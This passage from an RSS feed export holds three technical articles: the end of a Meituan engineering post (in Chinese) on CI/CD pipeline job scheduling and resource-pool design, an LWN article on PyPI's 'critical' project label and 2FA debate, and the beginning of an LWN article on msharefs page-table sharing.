referrerpolicy=\"no-referrer\"></p><p><strong>未收到决策事件</strong>：由于决策者服务自身的问题或网络原因，导致决策事件的请求失败，作业长时间处于未调度状态。</p><ul><li>解决方案：引入定时监测的机制，对于无过程状态作业且处于未完结状态的流水线进行重新决策，避免决策服务短时间异常导致决策失败。</li></ul><p><strong>重复决策</strong>：由于网络延迟、消息重试现象可能出现多个决策者同时决策同一个作业，产生作业转移的并发问题。</p><ul><li>解决方案：增加pending的状态表示作业已被决策到，并通过数据库乐观锁机制进行状态变更，保证仅有一个决策会真正生效。</li></ul><p><strong>状态变更过程异常</strong>：由于存在异构数据库，状态变更和加入队列可能存在数据不一致，导致作业无法被正常调度。</p><ul><li>解决方案：采用最终一致性的方案，允许调度的短暂延迟。采用先变更数据库，再加入队列的操作顺序。利用补偿机制，定时监测队列队首的作业信息，若pending状态下的作业有早于队首作业的，进行重新入队操作。</li></ul><p><strong>作业拉取过程</strong>：任务中心根据Worker拉取作业的事件请求，从等待队列中获取待调度作业，将作业的状态从pending变更为scheduled，并返回给Worker。</p><p><img src=\"https://p0.meituan.net/travelcube/f5cc9da5aa8a29af29014ccafbcf8d8999788.png\" alt=\"图6 状态机-ACK\" referrerpolicy=\"no-referrer\"></p><p><strong>作业丢失问题</strong>：这里存在两种情况，①作业从队列中移除，但在状态将要变更时异常了；②作业从队列中移除，也正确变更了状态。但由于poll请求连接超时，未正常返回给Worker。</p><ul><li>解决方案：前者通过作业决策环节中对pending状态的作业补偿机制，重新加入队列；后者对于状态已变更的情况，已调度的作业增加ACK机制，若超时未确认，状态会流转回pending状态，等待被重新拉取。</li></ul><p><strong>作业被多个Worker拉取</strong>：Worker在接收到作业后，遇到长时间的GC，导致状态流转回pending状态，在Worker恢复后，可能出现作业已分配到另一个Worker上。</p><ul><li>解决方案：通过数据库乐观锁机制保证仅有一个Worker更新成功，并记录作业与Worker的关系，便于对作业进行中止以及Worker故障后的恢复操作。</li></ul><p><strong>3）决策过程</strong></p><p>决策过程是从所有未启动的作业中筛选出可以被调度的作业，通过一定的顺序将其提交给任务中心，等待被资源拉取的过程。整个筛选过程可以分为串并行顺序、条件过滤、优先级设置三部分。</p><p><img src=\"https://p0.meituan.net/travelcube/97847e8a75a70183d1b627d60c9ea80399713.png\" alt=\"图7 决策过程\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>串并行顺序</strong>：相对于DAG中复杂的寻路场景，流水线场景比较明确，是将代码逐步加工验证，通过开发、测试、集成、上线等一系列阶段的过程。阶段间是严格串行的，阶段内出于执行效率的考虑，会存在串并行执行的情况。这里通过模型设计，将DAG的调度问题转变成作业的先后次序问题，引入<strong>run order</strong>概念，为每个组件作业设置具体的执行次序，根据当前已执行作业的次序，快速筛选出下一批次序仅大于当前的作业，若并行执行，仅需将作业的次序设置成相同即可。</li></ul><p><img src=\"https://p0.meituan.net/travelcube/0a1da147444b28a9b2e4d56467f61b0286749.png\" alt=\"图8 串并行决策\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>条件过滤</strong>：随着业务场景扩展，不是所有的作业都需要调度资源，进行真正的执行。如某类耗时的组件，在代码和组件参数都不变的情况下，可以直接复用上一次的执行结果，或者在系统层面针对某类工具异常时进行组件跳过的降级操作。针对这类情况，在作业真正提交给任务中心之前，会增加一层条件判断（条件分为全局设置的系统条件以及用户条件），这些条件以责任链形式进行依次匹配过滤，根据匹配到的条件单独向任务中心提交决策。</li><li><strong>优先级设置</strong>：从系统全局考虑，在作业出现积压时，业务更关心核心场景下整条流水线是否能尽早执行完成，而不是单个作业的排队情况。所以，在优先级设置上除了基于<strong>时间戳的相对公平策略</strong>外，引入<strong>流水线类型的权重值</strong>（如发布流水线&gt;自测流水线；人工触发&gt;定时执行），保证核心场景流水线相关作业能够尽早被调度到。</li></ul><h3>4.2 资源池划分设计</h3><p><strong>1）整体方案</strong></p><p>我们采用多队列的设计，结合标签建立作业队列与资源池的匹配关系，以保障不同队列资源的有效划分，在出现队列积压、资源池故障、无可扩资源等情况时，最大限度地降低影响范围，避免所有作业全局排队等待的现象。</p><p><img src=\"https://p1.meituan.net/travelcube/94df06f861f63276c590b25e91ca4431319064.png\" alt=\"图9 资源池架构\" referrerpolicy=\"no-referrer\"></p><p><strong>2）模型关系</strong></p><p><img src=\"https://p0.meituan.net/travelcube/96e2d1ee493eb6972b4cf683ff67d4a355708.png\" alt=\"图10 资源池模型对象\" referrerpolicy=\"no-referrer\"></p><p><strong>作业队列与标签的关系</strong>：队列与标签采用1对1的关系，降低业务理解和运维成本。</p><ul><li>当队列积压时，能快速定位到某个标签没资源了。</li><li>标签资源不足时，也能快速判断影响的具体队列情况。</li></ul><p><strong>标签与资源池的关系</strong>：标签和资源池采用多对多的关系，主要从资源整体利用率和对核心队列的资源可用性保障考虑。</p><ul><li>对于一些作业量较少的队列，单独分配一个资源池会造成大部分时间资源是空闲状态，资源利用率低。我们通过给资源池打多标签的方式，既保证了队列有一定的资源配额，同时也能处理其他标签的作业，提高资源的利用率。</li><li>对于核心场景的队列，通常标签资源会分配到多个资源池上，保证资源的一定冗余，同时也降低单个资源池整体故障带来的影响。</li></ul><p><strong>3）标签设计</strong></p><p>标签的目的是建立资源（池）与作业（队列）的匹配关系。在设计上，为便于标签管理和后期维护，我们采用二维标签的形式，通过组件和流水线两个维度，共同决定一个作业所属标签及对应的资源。</p><ul><li><strong>第一维度</strong>：组件维度，对资源做通用划分。结合组件的业务覆盖情况、作业执行量、对机器和环境的特殊要求（如SSD、Dev环境等），对需要独立资源的组件进行打标，划分出不同的公共资源池（每个公共资源池执行一类或多类组件作业），在引擎层面统一分配，保证所有作业都有可正常运行。</li><li><strong>第二维度</strong>：流水线维度，根据业务场景进行划分。结合业务对资源隔离/作业积压敏感度的诉求，按需进行划分。有些希望资源完全独立的业务，会从所有的公共资源池进行切分；有些仅对部分核心场景下的资源需要保障，根据链路上涉及的组件，选择性地从部分公共资源池进行划分，实现业务隔离和资源利用率的平衡。</li></ul><blockquote><p>注：每个维度都会设一个other的默认值用来兜底，用于处理无资源划分需求的场景。</p></blockquote><p><img src=\"https://p0.meituan.net/travelcube/382508f39bc625bfdc4fb44c4fd51afe146951.png\" alt=\"图11 标签设计\" referrerpolicy=\"no-referrer\"></p><p><strong>4）队列拆分设计</strong></p><p>根据作业所属标签不同拆分出多个队列，保证每个队列的独立性，降低作业积压的影响范围。整个拆分过程可以分为入队和出队两部分：</p><ul><li><strong>入队过程</strong>：通过计算作业在组件和流水线两个维度的属性值，来确定作业对应的标签。结合模型关系中标签与队列（1对1）的关系，为每个标签按需创建一个队列，存储该标签作业，不同队列间作业做排他处理，简化出队的实现复杂度。</li><li><strong>出队过程</strong>：队列拆分后，因为标签和资源池（多对多）的关系，资源池的一次作业拉取请求往往会涉及多个队列。出于拉取效率的考虑，采用轮询的方式依次对单队列进行出队操作，直到达到该次请求的作业数上限或所有可选队列为空时返回结果。该方式可以<strong>避免同时对多个队列加锁</strong>，并且在前置环节会<strong>对多标签进行随机排序</strong>，降低多个请求同时操作一个队列的竞争概率。</li></ul><p><img src=\"https://p1.meituan.net/travelcube/86f3721bbf0ee9b749871832699af271212509.png\" alt=\"图12 队列拉取设计\" referrerpolicy=\"no-referrer\"></p><h3>4.3 组件分层设计</h3><p><strong>1）分层架构</strong></p><p><img src=\"https://p0.meituan.net/travelcube/2fb7dab8c09c6add38ec88ac927e0b9e213413.png\" alt=\"图13 组件架构设计\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>业务层</strong>：引入适配层，满足组件开发中多样化的需求场景，同时避免上层差异污染到下层。</li><li><strong>系统交互层</strong>：设立统一的流程标准，保证引擎和组件交互过程的一致性，便于统一处理非功能性的系统优化。</li><li><strong>执行资源层</strong>：提供多种资源策略，向上层屏蔽不同资源类型的差异。</li></ul><p><strong>2）标准的交互流程设计</strong></p><p>在系统交互层，组件与引擎交互的过程中，有两个环节是确定的，①组件作业的状态机流转，这涉及到组件执行的整个生命周期管理，若允许存在不同的状态流转关系，整个管理过程会十分混乱；②引擎对外提供的接口范围，从服务间解耦的角度，对外提供的接口主要是组件作业维度的接口操作，不应该耦合任何组件内部的实现细节。</p><p>结合作业状态机 + 引擎提供的接口，确定了组件执行基本的系统交互流程。利用模版模式，抽象出<code>init()</code>、<code>run()</code>、<code>queryResult()</code>、<code>uploadArtifacts()</code> 等<strong>必要方法</strong>供业务实现，整个交互流程则由系统统一处理，业务无需关心。</p><p><img src=\"https://p0.meituan.net/travelcube/fe5bc656c37434629144ac4d0647e3f4228820.png\" alt=\"图14 组件标准流程设计\" referrerpolicy=\"no-referrer\"></p><p><strong>3）扩展基础能力</strong></p><p>组件执行除了正常的执行流程外，随着业务场景的丰富，还会涉及组件中止、回调（人工审批场景）等操作，这些操作的引入势必会改变原先的交互流程。为了不增加额外的交互复杂度，在拉取作业环节，<strong>增加作业的事件类型</strong>（运行、中止、回调等事件），Worker根据拉取到的不同事件，执行相应的扩展逻辑。同时，引入新的扩展也不会影响到已有的交互流程。</p><p><img src=\"https://p0.meituan.net/travelcube/72fafafecd96e8f2e517aa5b2a3eb1b1148695.png\" alt=\"图15 组件扩展能力设计\" referrerpolicy=\"no-referrer\"></p><p>基于上述扩展，我们可能更好地将一些通用能力下沉到Daemon Thread层。如结果查询流程，通过守护线程的方式，取消了原先同步等待的查询限制，这对于需要异步化处理的场景（如组件作业逻辑已执行完，仅在等待外部平台接口返回结果）可以提前释放资源，提高资源执行的利用率。并且，当执行资源故障重启后，结果查询线程会自动恢复待处理异步作业。这部分能力的支持在业务层是透明的，不改变整个交互流程。</p><p><strong>4）引入适配器</strong></p><p>业务虽可以通过必要方法完成自定义组件，但这些方法过于基础，业务在一些特定场景下实现成本较高。如对于组件支持Shell的脚本化调用，业务其实仅需提供可执行的Shell即可，通用约定的方式，其他必要方法的实现都可以交由系统完成。</p><p>针对业务个性化的处理，采用适配器模式，通用引入不同Command（ShellCommand、xxCommand）来默认实现特定场景下的必要方法，降低业务的开发成本。同时，保持系统侧流程的一致性，通过<strong>动态注入 Command</strong>的方式，防止对业务个性化处理的耦合。</p><p><img src=\"https://p0.meituan.net/travelcube/008e15dbccbc7b0e895dbcfd6c168081208244.png\" alt=\"图16 组件适配器设计\" referrerpolicy=\"no-referrer\"></p><p><strong>5）效果</strong></p><p>目前已支持Shell组件、服务组件、容器组件等多种接入方式，平台上已提供<strong>数百个组件</strong>，组件开发方涉及<strong>数十个业务线</strong>。组件库覆盖源码域、构建域、测试域、部署域、人工审批域等多个环节，打通了研发过程所涉及的各个基础工具。</p><p><img src=\"https://p0.meituan.net/travelcube/e0ba883e4ca81c753af4a37b856a6e2a431989.png\" alt=\"图17 组件库\" referrerpolicy=\"no-referrer\"></p><h2>5. 后续规划</h2><ul><li>借助Serverless等云原生技术，探索更轻量、高效的资源管理方案，提供更精细化的资源策略，从资源的弹性、启动加速、环境隔离三个方面为业务提供更优的资源托管能力。</li><li>面向组件开发者，提供从开发、上线到运营的一站式开发管理平台，降低组件开发、运营成本，使更多工具方、个人开发者能参与其中，共同打造丰富多样的业务场景，形成良性的组件运营生态。</li></ul><h2>6. 本文作者</h2><p>耿杰、春晖、志远等，来自研发质量与效率部研发平台团队。</p><h2>招聘信息</h2><p>美团研发质量及效率部，负责公司研发效能领域平台和工具的建设（包括研发需求管理工具、CI/CD流水线、分布式代码仓库、多语言构建工具、发布平台、测试环境管理平台、全链路压测平台等），致力于不断推进优秀的研发理念和工程实践，建设一流的工程基础设施。我们长期招聘高级、资深技术专家，Base北京、上海。感兴趣的同学可以将简历发送至gengjie02@meituan.com（邮件主题：美团研发质量及效率部）。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "900953",
    "timestampUsec": "1658160616314571",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "&quot;Critical&quot; projects and volunteer maintainers",
    "author": ";jake",
    "published": 1657746060,
    "updated": 1657746060,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/900953/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>July 13, 2022\n           </div>\n<p>\nOver the last five decades or so, free and open-source software (FOSS) has\ngone from an almost unknown \nquantity available to only the most technically savvy to underpinning much\nof the infrastructure we rely on today.  Much like software itself, FOSS is\n\"eating the world\".  But that has changed—is changing—the role of the\nmaintainers of all of that code; when \"critical\" infrastructure uses code\nfrom a FOSS project, suddenly, and perhaps without warning, that code\nitself becomes critical.  But many maintainers of that software are\nvolunteers who did not set out to become beholden to the needs of large\ncompanies and organizations when they released their code, they were just\nscratching their itch—now lots of others are clamoring for theirs to be\nscratched as well.  \n</p>\n\n<p>\nThe supply-chain security problem is clearly a serious one that needs\nto be addressed.  The <a href=\"https://lwn.net/Articles/878570/\">Log4j incident</a>\nprovides a recent example of how a security vulnerability in a fairly small\ncomponent can ripple out across the internet by way of dependency chains.\nSome projects depended directly on Log4j, but many others became\nvulnerable because they were using some <i>other</i> library or package\nthat depended on Log4j—directly or indirectly.\n</p>\n\n<p>\nSome of the places where dependency chains are often lengthy, and thus more\nvulnerable to the intentional injection of malware, are various\nlanguage-specific repositories of packages.  Sites like the <a href=\"https://pypi.org/\">Python Package Index</a> (PyPI) provide a huge\npalette of components that can be used by applications or other libraries.\nThe <tt>pip</tt> tool that comes with Python will happily install PyPI\npackages along with all of their dependencies, recursively.  Many other\nlanguages have similar repositories and tooling.\n</p>\n\n<h4>Critical components</h4>\n\n<p>\nThere are multiple efforts these days to identify the most critical\ndependencies and to provide assistance to those projects so that they do\nnot end up in the <a href=\"https://lwn.net/Articles/702751/\">position of a pre-Heartbleed\nOpenSSL</a>—or represent that one project in the <a href=\"https://xkcd.com/2347/\">classic xkcd</a>. For example, the <a href=\"https://openssf.org/\">Open \nSource Security Foundation</a> (OpenSSF) has its <a href=\"https://openssf.org/community/alpha-omega/\">Alpha-Omega project</a>\nthat is identifying projects needing assistance with their security.\nPyPI has also been identifying its packages that have been downloaded the\nmost over the last six months based on its <a href=\"https://warehouse.pypa.io/api-reference/bigquery-datasets.html\">public\ndata sets</a>; those that are in the top 1% are deemed \"critical\".  Roughly\n3500 projects have been identified in this manner and the maintainers of those projects\nare being <a href=\"https://pypi.org/security-key-giveaway/\">offered a free\nsecurity key</a> to help them set up <a href=\"https://en.wikipedia.org/wiki/Multi-factor_authentication\">two-factor\nauthentication</a> (2FA) for their PyPI accounts.\n</p>\n\n<p>\nAuthentication using 2FA is not currently required for any packages, but\nPyPI plans to require it for maintainers of critical projects \"<q>in the\ncoming months</q>\".  Once that goes into effect, maintainers who have not\nenabled 2FA (using a security key or <a href=\"https://en.wikipedia.org/wiki/Time-based_one-time_password\">time-based\none-time password</a> (TOTP) application) will presumably not be able to\nmake changes, such as updating the package.  That, of course, has its own\nrisk, in that a critical package may not be able to get the update it needs\nfor some serious vulnerability because its maintainers failed to sign up\nfor 2FA.\n</p>\n\n<p>\nOn July 8, Skip Montanaro <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219\">posted</a>\na message to the Python discussion forum noting that a defunct project of\nhis, <a href=\"https://pypi.org/project/lockfile/\">lockfile</a>, had been\nidentified as critical.  The project had been marked as deprecated at the\ntop of its <tt>README</tt> (with alternatives listed) and has\nnot seen any releases since 2015.  He wondered why it was considered\ncritical and asked: \"<q>What should I do to get rid of this designation?</q>\"\n</p>\n\n<p>\nDonald Stufft <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/2\">said</a>\nthat the package is being downloaded roughly 10-million times per month.\nDustin Ingram pointed to the FAQ in the security-key giveaway announcement\nthat says \"<q>once the project has been designated as critical it retains\nthat designation indefinitely</q>\", so lockfile will be considered critical\nhenceforth. The lockfile module is part of the <a href=\"https://www.openstack.org/\">OpenStack project</a>; the\n<tt>README</tt> file for lockfile suggests contacting the openstack-dev\nmailing list for assistance in moving away from it.\n</p>\n\n<p>\nIt turns out that \"<q>no OpenStack projects declare direct dependencies on lockfile since\nMay 2015</q>\", <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/6\">according\nto \"fungi\"</a>, who is a system administrator for OpenStack.   But\n lockfile is still used by parts of the OpenStack project.\nIn a perfect demonstration of the insidious nature of dependency chains,\nfungi <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/11\">tracked down its use</a> by the project:\n</p><blockquote>\nI've found that some OpenStack projects depend on ansible-runner,\nwhich in turn depends on python-daemon, which itself declares a\ndependency on lockfile. I'll need to confer with other contributors\non a way forward, but probably it's to either help python-daemon\nmaintainers replace their use of lockfile, or help ansible-runner\nmaintainers replace their use of python-daemon.\n</blockquote>\n<p></p>\n\n<p>\nSo most or all of the downloads of this \"critical\" PyPI project are\nprobably for continuous-integration testing of OpenStack  and the\ncomponents that use lockfile should likely have replaced it with something\nelse nearly eight years ago.  Hugo van Kemenade <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/12\">suggested</a>\nencouraging people to stop using it; \"<q>if you're still in a position to\nrelease, emit a DeprecationWarning on import suggesting the\nreplacements. Or something noisier like a UserWarning.</q>\" Paul Moore <a href=\"https://discuss.python.org/t/a-defunct-project-of-mine-has-been-categorized-as-critical/17219/13\">noted</a>\nthat marking it as deprecated did not work, nor did ceasing releases\nin 2015; \"<q>I'm not at all sure 'tell people not to use it' is a\nviable strategy for getting marked as 'not critical'.</q>\" \n</p>\n\n<h4>Opinions</h4>\n\n<p>\nOn July 9, Armin Ronacher <a href=\"https://lucumr.pocoo.org/2022/7/9/congratulations/\">posted</a> his\nthoughts about PyPI's 2FA requirement; that post was extensively discussed\n<a href=\"https://lwn.net/Articles/900671/\">here at LWN</a>, <a href=\"https://news.ycombinator.com/item?id=32037562\">at Hacker News</a>,\nand elsewhere.  Ronacher makes it clear that he does not see 2FA as an\nunreasonable burden for maintainers of PyPI projects, but he does wonder\nwhere it all leads.  For one thing, it is, apparently, only critical\npackages at PyPI that will be required to have 2FA set up, so \"<q>clearly\nthe index [PyPI] considers it burdensome enough to not enforce it for everybody</q>\".\n</p>\n\n<p>\nThat creates something of a double standard.  As Ronacher put it, he did\nnot set out to  create a critical package, that was something that happened\norganically.  But the kinds of problems that can be prevented through 2FA,\nsuch as a malicious actor logging into PyPI with stolen credentials, can\nhappen with any package, not just popular ones. \"<q>In theory that type of\nprotection really should apply to every package.</q>\" \n</p>\n\n<p>\nBut there is also a question of what <i>else</i> might be required down the\nroad.  When the projects at PyPI today were created, there was no mention\nof 2FA, so other things may be added down the road as well.  \n</p><blockquote>\nThere is a hypothetical future where the rules tighten. One could imagine\nthat an index would like to enforce cryptographic signing of newly released\npackages. Or the index wants to enable reclaiming of critical packages if\nthe author does not respond or do bad things with the package. For instance\na critical package being unpublished is a problem for the ecosystem. One\ncould imagine a situation where in that case the Index maintainers take\nover the record of that package on the index to undo the damage. Likewise\nit's more than imaginable that an index of the future will require packages\nto enforce a minimum standard for critical packages such as a certain SLO\n[service level objective] for responding to critical incoming requests (security, trademark laws etc.).\n</blockquote>\n<p></p>\n\n<p>\nSome of those\nrequirements make perfect sense from a security standpoint; in fact, some should\nperhaps be in place already.  But there is now an ongoing <a href=\"https://discuss.python.org/t/stop-allowing-deleting-things-from-pypi/17227\">discussion</a>\nabout disallowing projects from being deleted from PyPI.  Obviously\ndeleting a project that other projects rely on is kind of an antisocial\nact, but it does seem like something the author (and probably copyright\nholder) should be allowed to do.  It can lead to chaos like the <a href=\"https://lwn.net/Articles/681410/\">famous left-pad fiasco</a>, however.  \n</p>\n\n<p>\nThe\nrecent 2FA push from PyPI led a maintainer to <a href=\"https://github.com/untitaker/python-atomicwrites/issues/61\">accidentally\nremove all of the old releases</a> of the <a href=\"https://pypi.org/project/atomicwrites/\">atomicwrites</a> package.  As\nnoted by Stufft in the PyPI deletion discussion linked above, he restored\nthe atomicwrites releases at the request of the maintainer, but \"<q>it took\nabout an hour to restore 35 files</q>\".   Finding a way to head off those\nkinds of mistakes would be useful in addition to preventing downstream\nchaos when a maintainer deletes their project.\n</p>\n\nAs Ronacher noted, he is using the resources of PyPI for the distribution\nof his projects, so he is willing to follow its rules, which are aimed at\nprotecting the users of the index.  But PyPI (and other similar\nrepositories for other languages) have something close to a monopoly over\nproject distribution, since <tt>pip</tt> is tied to it.  He wondered if a\nsolution along the lines of the <a href=\"https://lwn.net/Articles/897435/\"><tt>cargo vet</tt> tool</a> for Rust might\nmean that package indexes can get out of the job of enforcing security\npolicies and to leave it to others to do so:\n<blockquote>\nWhat I like about the <tt>cargo-vet</tt> approach is that it separates the\nconcerns of running an index from vetting. It also means that in theory\nthat multiple competing indexes could be provided and vetting can still be\ndone. Most importantly it puts the friction of the vetting to the community\nthat most cares about this: commercial users. Instead of Open Source\nmaintainers having to jump through more hoops, the vetting can be\noutsourced to others. Trusted \"Notaries\" could appear that provide vetting\nfor the most common library versions and won't approve of a new release\nuntil it undergoes some vetting. \n</blockquote>\n\n<h4>Reaction</h4>\n\n<p>\nDjango developer James Bennett had a <a href=\"https://www.b-list.org/weblog/2022/jul/11/pypi/\">sharply worded\nreply</a> to Ronacher on July 11 (which was also <a href=\"https://news.ycombinator.com/item?id=32061428\">discussed at Hacker\nNews</a> and no doubt elsewhere).  In much of it, Bennett seems to\nbe reacting to the arguments that others are making, rather than those that\nRonacher made.  But Bennett's main complaint with Ronacher is that he thinks\nthe <tt>cargo vet</tt> approach is flawed and that those who release\nFOSS have a responsibility to users in an \"<q>ethical and social sense</q>\", even\nthough any legal responsibility has been disclaimed in the\nlicense. \"<q>Yeah, if you publish open-source code you do have some\nresponsibilities, whether you want them or not.</q>\" \n</p>\n\n<p>\nBennett's list of responsibilities for a FOSS maintainer seem generally\nreasonable, \"<q>because what they really boil down to is the basic societal\nexpectation of 'don't be an asshole'</q>\".  But he is raising a strawman\nhere, since Ronacher never argued that maintainers should be \n(allowed to be)\nassholes.  Ronacher simply wondered what other requirements might be\nimposed on maintainers over time, some of those that he mentioned\n(e.g. a service level objective) would be quite\nonerous for a volunteer maintainer. \n</p>\n\n<p>\nBennett's weakest argument seems to be that Ronacher owes more to his users\nthan he might voluntarily choose to give because his work on FOSS has\nopened various doors for him.  It is a fairly strange argument, in truth.\nOverall, Bennett seems to be addressing lots of things that Ronacher did\nnot say, or even imply.  The heart of what Ronacher was trying to do was to\ntry to figure out where the boundaries are, not to claim they had already\nbeen crossed.\n</p>\n\n<p>\nIt seems vanishingly unlikely that PyPI will be establishing two-day\nsecurity-fix timelines, for example, on its critical projects, but there\nare surely lots of companies and other organizations out there that wish it\nwould. There is a general tendency for all humans (and their constructs\nlike companies) to shirk responsibilities if they can find another to pin\nthem on.  Companies and organizations that are shipping software that is dependent on the\nFOSS supply chain need to be deeply involved in ensuring that the code is secure.\n</p>\n\n<p>\nDoing that work will cost a lot of money and take a lot of time.  We are\nseeing efforts to do that work, and the PyPI 2FA requirement is one of\nthose pieces.  It is hardly a panacea, but it is a useful step.  \n</p>\n\n<p>\nAs Luis Villa <a href=\"https://opensource.com/article/21/8/open-source-maintainers\">noted</a>\nlast year, FOSS maintainers are being asked to do more and more things;\noften they are being asked to do so without any compensation, though\nperhaps \"doors opening\" counts to a limited extent.   As more critical\nprojects are identified, it is likely we will see more conflicts of this\nnature.  What happens when a maintainer does not want to follow the\nrecommendations of OpenSSF (or some other similar effort) on changes?\nForks are generally seen as a hostile move, but one suspects that may\nultimately happen for projects that find themselves at odds with sponsoring\norganizations.  That is a rather different world than the one FOSS grew up in.\n</p><br clear=\"all\"><div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "901059",
    "timestampUsec": "1658160616314580",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Sharing page tables with msharefs",
    "author": ";corbet",
    "published": 1657894440,
    "updated": 1657894440,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/901059/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 15, 2022\n           </div>\nA page-table entry (PTE) is relatively small, requiring just eight bytes to refer to a\n4096-byte page on most systems.  It thus does not seem like a worrisome\nlevel of overhead, and little effort has been made over the kernel's\nhistory to reduce page-table memory consumption.  Those eight bytes can\nhurt, though, if they are replicated across a sufficiently large set of\nprocesses.  The <a href=\"https://lwn.net/ml/linux-mm/cover.1656531090.git.khalid.aziz@oracle.com/\">msharefs\npatch set</a> from Khalid Aziz is a revised attempt to address that\nproblem, but it is proving to be a hard sell in the memory-management\ncommunity.\n<p>\nOne of the defining characteristics of a process on Linux (or most other\noperating systems) is a distinct address space.  As a result, the page\ntables that manage the state of that address space are private to each\nprocess (though threads within a process will share page tables).  So if\ntwo processes have mappings to the same page in physical memory, each will\nhave an independent page-table entry for that page.  The overhead for\nPTEs, thus, increases linearly with the number of processes\nmapping each page.\n</p><p>\nEven so, this cost is not normally problematic, but there is always\nsomebody out there doing outlandish things.  As described in the cover\nletter from the patch series:\n</p><p>\n</p><blockquote>\n\tOn a database server with 300GB SGA [<a href=\"https://docs.oracle.com/database/121/ADMQS/GUID-A3319550-AB7A-4429-9A58-4B90E4B3D0F5.htm\">Oracle\n\tsystem global area</a>], a system crash was seen with\n\tout-of-memory condition when 1500+ clients tried to share this SGA\n\teven though the system had 512GB of memory. On this server, in the\n\tworst case scenario of all 1500 processes mapping every page from\n\tSGA would have required 878GB+ for just the PTEs. If these PTEs\n\tcould be shared, the amount of memory saved is very significant.\n</blockquote>\n<p>\nSharing those PTEs is the objective of this work, which was <a href=\"https://lwn.net/Articles/895217/\">discussed</a> at the Linux Storage, Filesystem,\nMemory-Management, and BPF Summit in May.  At that time, Aziz was proposing\na new system call (<tt>mshare()</tt>) to manage this sharing.  The current\npatch set has changed this interface and now requires no new system calls\nat all.\n</p><p>\nEven without the system call,\nit is still necessary for processes to explicitly request the sharing of\npage tables for a range of memory.  The current patch set provides yet\nanother kernel virtual filesystem — msharefs — for that purpose; it is\nexpected to be mounted on <tt>/sys/fs/mshare</tt>.  The file\n<tt>mshare_info</tt> in that filesystem will, when read, provide the\nminimum alignment required for a memory region to be able to share page tables.\n</p><p>\nThe next step is to create a file under <tt>/sys/fs/mshare</tt> with a name\nthat means something to the application.  Then, an <a href=\"https://man7.org/linux/man-pages/man2/mmap.2.html\"><tt>mmap()</tt></a>\ncall should be used to map that file into the process's address space.  The\nsize passed to <tt>mmap()</tt> will determine the size of the resulting\nshared region of memory.  Your editor's reading of the code suggests that\nproviding an explicit address for the mapping is advisable; there does not\nappear to be any mechanism to automatically pick an address that meets the\nalignment requirements.\nOnce the region has been mapped, it can be used\njust like any other memory range.\n</p><p>\nThe purpose of creating such a region is to allow other processes to map it\nas well.  Any other processes will need to start by opening the msharefs\nfile created by the first process, then reading a structure of this type\nfrom it:\n</p><p>\n</p><pre>    struct mshare_info {\n\tunsigned long start;\n\tunsigned long size;\n    };\n</pre>\n<p>\nThe <tt>start</tt> and <tt>size</tt> fields provide the address at which\nthe region is mapped and its size, respectively; the new process should\npass those values (and the opened msharefs file) to its own <tt>mmap()</tt>\ncall to map the shared region.  After that, the region will be mapped just\nlike any other shared-memory area — with a couple of important exceptions,\nas will be described below.\n</p><p>\nA process's address space is described by <a href=\"https://elixir.bootlin.com/linux/v5.18.11/source/include/linux/mm_types.h#L476\"><tt>struct\nmm_struct</tt></a>; there is one such structure for each process (other than\nkernel threads) in the system.  The msharefs patch set changes the\nlongstanding one-to-one relationship between this structure and its owning\nprocess by creating a new <tt>mm_struct</tt> structure for each shared\nregion.  The page tables describing this region belong to this separate\nstructure, rather than to any process's <tt>mm_struct</tt>.  Whenever a\nprocess maps this region, the associated <a href=\"https://elixir.bootlin.com/linux/v5.18.11/source/include/linux/mm_types.h#L393\"><tt>vm_area_struct</tt></a>\n(VMA) will contain a pointer to this special <tt>mm_struct</tt>.  The end\nresult is that all processes mapping this area will share not just the\nmemory, but also the page tables that go along with it.\n</p><p>\nThat saves the memory that would have gone into duplicate page tables, of\ncourse, but it also has a couple of other, possibly surprising, results.\nFor example, changing the protection of memory within that region with <a href=\"https://man7.org/linux/man-pages/man2/mprotect.2.html\"><tt>mprotect()</tt></a>\nwill affect all processes sharing the area; with ordinary shared memory,\nonly the calling process will see protection changes.  Similarly, the\nmemory region can be remapped entirely with <a href=\"https://man7.org/linux/man-pages/man2/mremap.2.html\"><tt>mremap()</tt></a>\nand all users will see the change.\n</p><p>\nIt appears that use of <tt>mremap()</tt> is actually part of the expected\npattern for PTE-shared memory regions.  The <tt>mmap()</tt> call that is\nrequired to create the region will populate that region with anonymous\nmemory; there is no way to request that file-backed memory be used instead.\nBut it <i>is</i> possible to use <tt>mremap()</tt> to dump that initial\nmapping and substitute file-backed memory afterward.  So applications\nwanting to use shared page tables with file-backed memory will have to\nperform this extra step to set things up correctly.\n</p><p>\nThe developers at the LSFMM session were clear that they found this whole\nconcept to be somewhat frightening.  So far, the reaction to this patch\nseries has (from a memory-management point of view) been relatively\nsubdued, with the exception of David Hildenbrand, who is <a 